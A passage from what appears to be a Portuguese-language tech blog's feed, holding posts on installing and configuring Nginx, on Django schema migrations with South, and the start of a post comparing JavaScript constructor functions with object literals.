tríade "AMP" (&lt;em&gt;Apache&lt;/em&gt;, &lt;a href="http://www.mysql.com/" title="Conheça o banco de dados open source mais popular do mundo"&gt;&lt;em&gt;MySQL&lt;/em&gt;&lt;/a&gt; e &lt;em&gt;PHP&lt;/em&gt;).&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Acontece que com as demandas recentes que a &lt;em&gt;internet&lt;/em&gt; tem exigido de
algumas aplicações &lt;em&gt;web&lt;/em&gt; (como &lt;em&gt;Twitter&lt;/em&gt; e &lt;em&gt;Facebook&lt;/em&gt;), a necessidade
por performance começou a ser uma grande premissa em determinados tipos
de projetos. E é apoiado nesse cenário que o &lt;em&gt;Nginx&lt;/em&gt; vem ganhando
cada vez mais força no mercado. Afinal, não é a toa que ele é conhecido
por “aguentar porrada”.&lt;/p&gt;
&lt;h2&gt;A verdade sobre o Nginx (ou não)&lt;/h2&gt;
&lt;p&gt;O &lt;a href="http://nginx.org/" title="Conheça o Nginx!"&gt;&lt;em&gt;Nginx&lt;/em&gt;&lt;/a&gt; é um &lt;a href="http://pt.wikipedia.org/wiki/Servidor_web" title="Entenda o que é um servidor Web"&gt;&lt;strong&gt;servidor Web&lt;/strong&gt;&lt;/a&gt;, &lt;a href="http://pt.wikipedia.org/wiki/Proxy_reverso" title="Entenda o que é um Proxy Reverso"&gt;&lt;strong&gt;proxy reverso&lt;/strong&gt;&lt;/a&gt;,
&lt;strong&gt;proxy balanceador de carga&lt;/strong&gt;, e faz praticamente tudo que o &lt;em&gt;Apache&lt;/em&gt;
faz, só que muito mais rápido!&lt;/p&gt;
&lt;p&gt;Técnicamente, o &lt;em&gt;Nginx&lt;/em&gt; consome menos memória que o &lt;em&gt;Apache&lt;/em&gt;, pois lida
com requisições &lt;em&gt;web&lt;/em&gt; através do conceito de “event-based web server“,
já o &lt;em&gt;Apache&lt;/em&gt; é baseado no conceito “process-based server“. &lt;em&gt;David E.
Chen&lt;/em&gt; faz uma excelente analogia entre os dois conceitos em seu artigo
“&lt;a href="http://daverecycles.com/post/3104767110/explain-event-driven-web-servers-to-your-grandma" title="Leia esta boa analogia entre os conceitos"&gt;Explain “Event-Driven” Web Servers to Your Grandma&lt;/a&gt;“.&lt;/p&gt;
&lt;p&gt;Eles não são necessariamente “concorrentes”, &lt;em&gt;Apache&lt;/em&gt; e &lt;em&gt;Nginx&lt;/em&gt; podem
trabalhar juntos! &lt;em&gt;Paulo Higa&lt;/em&gt;, através do seu artigo
&lt;a href="http://paulohiga.com/posts/nginx-proxy-reverso-php-apache.php" title="Aprenda como fazer o Nginx tornar-se um proxy reverso"&gt;“Usando Nginx como proxy reverso e diminuindo o consumo do servidor&lt;/a&gt;“, nos mostra
como ele diminuiu o consumo de memória do &lt;em&gt;Apache&lt;/em&gt; fazendo com que as
requisições &lt;em&gt;web&lt;/em&gt; passassem primeiro pelo &lt;em&gt;Nginx&lt;/em&gt;. Desse modo, o
&lt;em&gt;Apache&lt;/em&gt; não precisou servir arquivos estáticos, e pode depender do bom
controle de &lt;em&gt;cache&lt;/em&gt; feito pelo &lt;em&gt;Nginx&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Bom, a intenção não é denegrir a imagem do &lt;em&gt;Apache&lt;/em&gt; (até parece que um
simples mortal como eu conseguiria tal feito), então vamos adiante.&lt;/p&gt;
&lt;h2&gt;Fácil?! Instalando e sendo bem recebido&lt;/h2&gt;
&lt;p&gt;Estou utilizando o &lt;a href="http://www.slackware.com/" title="Conheça e delicie-se com o Slackware Linux"&gt;&lt;em&gt;Slackware 13.37&lt;/em&gt;&lt;/a&gt; para realizar os procedimentos
abaixo, mas acredito que eles possam ser executados em qualquer
distribuição &lt;em&gt;Linux&lt;/em&gt;, sem maiores problemas.&lt;/p&gt;
&lt;p&gt;Vamos começar fazendo o &lt;em&gt;download&lt;/em&gt; da versão mais recente (até então),
direto do site oficial do &lt;em&gt;Nginx&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ wget http://nginx.org/download/nginx-1.0.11.tar.gz
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O procedimento de instalação não difere em nada do método tradicional
que estamos acostumados no &lt;em&gt;Linux&lt;/em&gt;. Apenas lembre-se de executar o
&lt;code&gt;make install&lt;/code&gt; como &lt;code&gt;root&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ tar -zxvf nginx-1.0.11.tar.gz&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; nginx-1.0.11
$ ./configure
$ make
$ make install
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O &lt;em&gt;Nginx&lt;/em&gt; será instalado em &lt;code&gt;/usr/local/nginx/&lt;/code&gt;. Você pode iniciar o
serviço através do comando (como &lt;code&gt;root&lt;/code&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ /usr/local/nginx/sbin/nginx
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Acessando o seu &lt;code&gt;localhost&lt;/code&gt;, o serviço estará pronto e dando boas
vindas!&lt;/p&gt;
&lt;h2&gt;Configurando um servidor simples&lt;/h2&gt;
&lt;p&gt;Para homenagear o nosso amigo &lt;em&gt;Apache&lt;/em&gt;, vamos fazer o &lt;em&gt;Nginx&lt;/em&gt; servir um
&lt;a href="https://klauslaube.com.br/tag/html5.html" title="Leia mais sobre HTML5"&gt;&lt;em&gt;HTML&lt;/em&gt;&lt;/a&gt; com a clássica mensagem “It works“, em outra porta e &lt;em&gt;path&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Abra (como &lt;code&gt;root&lt;/code&gt;) o arquivo &lt;code&gt;/usr/local/nginx/conf/nginx.conf&lt;/code&gt;, no
final do arquivo, adicione a seguinte expressão antes do fechamento das
chaves:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;include&lt;/span&gt; &lt;span class="n"&gt;example&lt;/span&gt;;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esta expressão importará o arquivo &lt;code&gt;/usr/local/nginx/conf/example&lt;/code&gt;,
que criaremos a seguir:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;server&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kn"&gt;listen&lt;/span&gt;        &lt;span class="n"&gt;127.0.0.1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;8080&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kn"&gt;server_name&lt;/span&gt;   &lt;span class="s"&gt;example&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kn"&gt;access_log&lt;/span&gt;    &lt;span class="s"&gt;/usr/local/nginx/logs/example.access.log&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kn"&gt;error_log&lt;/span&gt;     &lt;span class="s"&gt;/usr/local/nginx/logs/example.error.log&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kn"&gt;location&lt;/span&gt; &lt;span class="s"&gt;/&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="kn"&gt;root&lt;/span&gt;  &lt;span class="s"&gt;/var/www/example&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="kn"&gt;index&lt;/span&gt; &lt;span class="s"&gt;index.html&lt;/span&gt; &lt;span class="s"&gt;index.htm&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Intuitivo não?! Vamos criar o &lt;em&gt;path&lt;/em&gt; onde armazenaremos o &lt;em&gt;HTML&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mkdir /var/www/example
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;It works! &amp;quot;&lt;/span&gt; &amp;gt; /var/www/example/index.html
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Basta acessar o endereço &lt;code&gt;localhost:8080&lt;/code&gt;, e pronto!&lt;/p&gt;
&lt;p&gt;Como é possível perceber, os arquivos de configuração do &lt;em&gt;Nginx&lt;/em&gt; são
simples e intuitivos. Existem várias referências na &lt;em&gt;web&lt;/em&gt; ensinando a
montar &lt;em&gt;proxy&lt;/em&gt; reverso, servir páginas dinâmicas com &lt;em&gt;FastCGI&lt;/em&gt; ou
&lt;em&gt;WSGI&lt;/em&gt;, utilizar &lt;em&gt;SSL&lt;/em&gt;, etc. Nada que o bom amigo &lt;em&gt;Google&lt;/em&gt; não possa
resolver.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Quer dizer que agora eu tenho que largar tudo e correr para utilizar o
&lt;em&gt;Nginx&lt;/em&gt;? A resposta é &lt;strong&gt;não&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Gosto dos ensinamentos do pessoal da &lt;a href="http://37signals.com/" title="Você não sabe o que é a 37Signals?"&gt;&lt;em&gt;37Signals&lt;/em&gt;&lt;/a&gt;, e um deles é para
deixarmos a preocupação com performance para quando isto for realmente
um problema (caso contrário, ninguém começaria projetos em &lt;em&gt;Ruby&lt;/em&gt; ou
&lt;em&gt;Python&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;Portanto, se você tem um &lt;em&gt;blog&lt;/em&gt; em &lt;em&gt;WordPress&lt;/em&gt; servido através de um
&lt;em&gt;Apache&lt;/em&gt;... deixe estar. Garanto que o &lt;em&gt;Apache&lt;/em&gt; é a melhor solução para
você neste momento. E caso você venha a ter problemas com performance,
garanto que instalar e configurar um &lt;em&gt;Nginx&lt;/em&gt; dentro da sua
infraestrutura será o menor dos seus problemas.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://nginx.org/" title="Conheça, instale e use agora o Nginx!"&gt;Site oficial do projeto &lt;em&gt;Nginx&lt;/em&gt; (em Inglês)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://daverecycles.com/post/3104767110/explain-event-driven-web-servers-to-your-grandma" title="Entenda a diferença entre o webserver baseado em eventos, e outro baseado em processos"&gt;&lt;em&gt;Daverecycles.com – Explain “Event-Driven” Web Servers to Your Grandma&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.linuxjournal.com/article/10108" title="Excelente artigo sobre o Nginx"&gt;&lt;em&gt;Linux Journal – Nginx: the High-Performance Web Server and Reverse Proxy&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://paulohiga.com/posts/nginx-proxy-reverso-php-apache.php" title="Artigo de Paulo Higa sobre Nginx e proxy reverso, com Apache"&gt;&lt;em&gt;Paulo Higa&lt;/em&gt; – Usando o &lt;em&gt;nginx&lt;/em&gt; como &lt;em&gt;proxy&lt;/em&gt; reverso e diminuindo o consumo do servidor&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://pt.wikipedia.org/wiki/Proxy_reverso" title="Leia mais na Wikipedia"&gt;&lt;em&gt;Wikipedia&lt;/em&gt; – &lt;em&gt;Proxy&lt;/em&gt; reverso&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://pt.wikipedia.org/wiki/Servidor_web" title="Leia mais na Wikipedia"&gt;&lt;em&gt;Wikipedia&lt;/em&gt; – Servidor &lt;em&gt;Web&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.wikivs.com/wiki/Apache_vs_nginx" title="Entenda um pouco mais a diferença entre Apache e Nginx"&gt;&lt;em&gt;WikiVS – Apache vs Nginx&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="infraestrutura"></category><category term="ambiente-de-desenvolvimento"></category><category term="nginx"></category><category term="linux"></category><category term="slackware"></category></entry><entry><title>Migrations em Django com South</title><link href="https://klauslaube.com.br/2011/11/20/migrations-em-django-south.html" rel="alternate"></link><published>2011-11-20T21:35:00-02:00</published><updated>2011-11-20T21:35:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2011-11-20:/2011/11/20/migrations-em-django-south.html</id><summary type="html">&lt;p&gt;E quem nunca precisou adicionar ou remover alguma
coluna, nas tabelas do seu banco de dados, depois que a aplicação já
estava em produção? Os riscos existem (e são altos), e podem ser
diminuidos através de processos automatizados.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Em um mundo ideal, o procedimento de &lt;em&gt;deploy&lt;/em&gt; (para entregas contínuas)
&lt;strong&gt;deve …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;E quem nunca precisou adicionar ou remover alguma
coluna, nas tabelas do seu banco de dados, depois que a aplicação já
estava em produção? Os riscos existem (e são altos), e podem ser
diminuidos através de processos automatizados.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Em um mundo ideal, o procedimento de &lt;em&gt;deploy&lt;/em&gt; (para entregas contínuas)
&lt;strong&gt;deve ser automatizado&lt;/strong&gt;. Com o &lt;em&gt;South&lt;/em&gt;, “migrar” a estrutura e os
dados da sua base de dados para a versão presente em seu novo deploy, é
simples, prático e 100% integrado ao &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Instalando o South&lt;/h2&gt;
&lt;p&gt;O &lt;a href="http://south.aeracode.org/" title="Página oficial do projeto South"&gt;&lt;em&gt;South&lt;/em&gt;&lt;/a&gt; é muito, mas muito simples de instalar. Utilizando o
&lt;em&gt;pip&lt;/em&gt;, basta o seguinte comando para termos os &lt;em&gt;eggs&lt;/em&gt; em nosso
&lt;code&gt;PYTHONPATH&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pip install south
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Não podemos esquecer de adicioná-lo ao &lt;code&gt;INSTALLED_APPS&lt;/code&gt; do
&lt;code&gt;settings.py&lt;/code&gt; (afinal, trata-se de uma &lt;em&gt;app Django&lt;/em&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;INSTALLED_APPS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;django.contrib.auth&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="o"&gt;...&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;south&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Pronto! Você acabou de ganhar alguns comandos para construir as suas
&lt;em&gt;migrations&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Direto para a prática&lt;/h2&gt;
&lt;p&gt;Sem perder tempo, vamos construir uma &lt;em&gt;app Django&lt;/em&gt; para que possamos
demonstrar o uso do &lt;em&gt;South&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ python manage.py startapp blog
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Lembrando de adicioná-la ao &lt;code&gt;settings.py&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# settings.py&lt;/span&gt;
&lt;span class="n"&gt;INSTALLED_APPS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;django.contrib.auth&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="o"&gt;...&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;south&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;blog&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos criar um modelo bem básico, com alguns campos (posteriormente,
incrementaremos esta estrutura):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# blog/models.py&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.db&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Blog&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Model&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;titulo&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Titulo&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;max_length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;texto&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;TextField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Texto&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Através do comando &lt;code&gt;schemamigration&lt;/code&gt;, com parâmetro &lt;code&gt;–-initial&lt;/code&gt;,
criaremos a nossa primeira migration:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ python manage.py schemamigration blog --initial
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vale notar que o comando acima não cria nenhuma tabela no banco de
dados. O que ele faz é criar um conjunto de instruções que representa
este modelo. Na medida que são feitas alterações no modelo, é necessário
gerar novas &lt;em&gt;migrations&lt;/em&gt;, que serão sempre baseados nas estruturas já
criadas.&lt;/p&gt;
&lt;p&gt;Por exemplo, vamos de fato criar a tabela &lt;em&gt;blog&lt;/em&gt; no banco de dados:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ python manage.py migrate blog

Running migrations &lt;span class="k"&gt;for&lt;/span&gt; blog:
- blog:0001_initial
- Loading initial data &lt;span class="k"&gt;for&lt;/span&gt; blog.
No fixtures found.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Se houvesse alguma &lt;em&gt;fixture&lt;/em&gt;, o &lt;em&gt;South&lt;/em&gt; faria o &lt;em&gt;insert&lt;/em&gt; das informações
para você.&lt;/p&gt;
&lt;p&gt;A primeira &lt;em&gt;migration&lt;/em&gt; foi criada. Como mencionado antes, a partir de
agora toda migration criada será baseada na &lt;em&gt;migration&lt;/em&gt; “anterior”
(podemos deduzir a ordem das &lt;em&gt;migrations&lt;/em&gt; através do prefixo numérico,
no caso acima, o &lt;code&gt;0001&lt;/code&gt; indica que esta é a primeira).&lt;/p&gt;
&lt;p&gt;Vamos adicionar um campo no modelo (que equivale a uma coluna no banco
de dados), para ilustrar a criação de novas &lt;em&gt;migrations&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# blog/models.py&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Blog&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Model&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;titulo&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Titulo&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;max_length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;resumo&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;TextField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Resumo&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;blank&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;null&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;texto&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;TextField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Texto&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Não é mais necessário o uso do parâmetro &lt;code&gt;-–initial&lt;/code&gt;, de agora em
diante precisaremos do parâmetro &lt;code&gt;–-auto&lt;/code&gt; (que construirá a
&lt;em&gt;migration&lt;/em&gt; automaticamente, de acordo com a primeira já existente):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ python manage.py schemamigration blog --auto

+ Added field resumo on blog.Blog
Created 0002_auto__add_field_blog_resumo.py. You can now apply this migration
with: ./manage.py migrate blog
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Pronto! Uma nova &lt;em&gt;migration&lt;/em&gt; foi criada… e com um nome bem intuitivo
(repare no prefixo numérico). Basta darmos a ordem de replicar estas
instruções no banco de dados:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ python manage.py migrate blog

Running migrations &lt;span class="k"&gt;for&lt;/span&gt; blog:
- Migrating forwards to 0002_auto__add_field_blog_resumo.
- blog:0002_auto__add_field_blog_resumo
- Loading initial data &lt;span class="k"&gt;for&lt;/span&gt; blog.
No fixtures found.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A nova coluna foi inserida na tabela &lt;em&gt;blog&lt;/em&gt;, sem necessitar de nenhuma
intervenção manual. Se você ficou curioso para saber como essa “mágica”
acontece, basta abrir as &lt;em&gt;migrations&lt;/em&gt; e ver que são instruções escritas
em &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;, que interagem com o banco de dados “por trás” do &lt;em&gt;ORM&lt;/em&gt;
do &lt;em&gt;Django&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;South&lt;/em&gt; possui mais alguns recursos interessantes (como &lt;em&gt;data
migrations&lt;/em&gt;), que você pode conferir &lt;a href="http://south.aeracode.org/docs/tutorial/index.html" title="Aprenda mais sobre o South"&gt;neste tutorial&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://south.aeracode.org/" title="Visite a página oficial do projeto South"&gt;&lt;em&gt;South – Intelligent schema and data migrations for Django&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="ambiente-de-desenvolvimento"></category><category term="python"></category><category term="django"></category><category term="migrations"></category><category term="south"></category></entry><entry><title>Javascript: A diferença entre Constructor Function e Object Literal</title><link href="https://klauslaube.com.br/2011/10/23/javascript-constructor-function-object-literal.html" rel="alternate"></link><published>2011-10-23T15:07:00-02:00</published><updated>2011-10-23T15:07:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2011-10-23:/2011/10/23/javascript-constructor-function-object-literal.html</id><summary type="html">&lt;p&gt;Meses atrás, &lt;a href="https://klauslaube.com.br/2011/05/16/fazendo-javascript-oo-de-forma-facil.html" title="Fazendo Javascript OO de forma fácil"&gt;escrevi sobre como era fácil criar objetos em &lt;em&gt;Javascript&lt;/em&gt;&lt;/a&gt;.
Devo confessar que, a minha visão sobre a utilização da &lt;a href="https://klauslaube.com.br/tag/oop.html" title="Leia mais sobre OOP"&gt;Orientação a Objetos&lt;/a&gt;
em &lt;a href="https://klauslaube.com.br/tag/javascript.html" title="Leia mais sobre Javascript"&gt;&lt;em&gt;Javascript&lt;/em&gt;&lt;/a&gt; era muito superficial, e que uma dúvida muito pertinente
surgiu na época: Onde usar &lt;em&gt;object literal&lt;/em&gt; e onde usar classes?&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Hoje, depois de entender …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Meses atrás, &lt;a href="https://klauslaube.com.br/2011/05/16/fazendo-javascript-oo-de-forma-facil.html" title="Fazendo Javascript OO de forma fácil"&gt;escrevi sobre como era fácil criar objetos em &lt;em&gt;Javascript&lt;/em&gt;&lt;/a&gt;.
Devo confessar que, a minha visão sobre a utilização da &lt;a href="https://klauslaube.com.br/tag/oop.html" title="Leia mais sobre OOP"&gt;Orientação a Objetos&lt;/a&gt;
em &lt;a href="https://klauslaube.com.br/tag/javascript.html" title="Leia mais sobre Javascript"&gt;&lt;em&gt;Javascript&lt;/em&gt;&lt;/a&gt; era muito superficial, e que uma dúvida muito pertinente
surgiu na época: Onde usar &lt;em&gt;object literal&lt;/em&gt; e onde usar classes?&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Hoje, depois de entender que a Orientação a Objetos no &lt;em&gt;Javascript&lt;/em&gt; não é
muito diferente da utilizada em outras linguagens, sou capaz de enxergar
as possibilidades utilizando as duas maneiras. E este é o objetivo deste
&lt;em&gt;post&lt;/em&gt;: &lt;strong&gt;compartilhar esta visão com vocês&lt;/strong&gt;.&lt;/p&gt;
&lt;h2&gt;Traçando um paralelo&lt;/h2&gt;
&lt;p&gt;O &lt;a href="http://net.tutsplus.com/" title="Não conhece o Nettuts? Não perca tempo!"&gt;&lt;em&gt;Nettuts&lt;/em&gt;&lt;/a&gt; fez um &lt;a href="http://net.tutsplus.com/tutorials/javascript-ajax/the-basics-of-object-oriented-javascript/" title="The Basics of Object-Oriented JavaScript"&gt;ótimo &lt;em&gt;post&lt;/em&gt;&lt;/a&gt; comparando as diferenças entre
os dois métodos de criação de objetos (este artigo é fortemente baseado
na publicação deles). Vamos adotar a estratégia deles e criar estruturas
semelhantes utilizando &lt;em&gt;object literal&lt;/em&gt; e &lt;em&gt;constructors&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;object_literal&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;Automovel&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;quantidadeRodas&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;


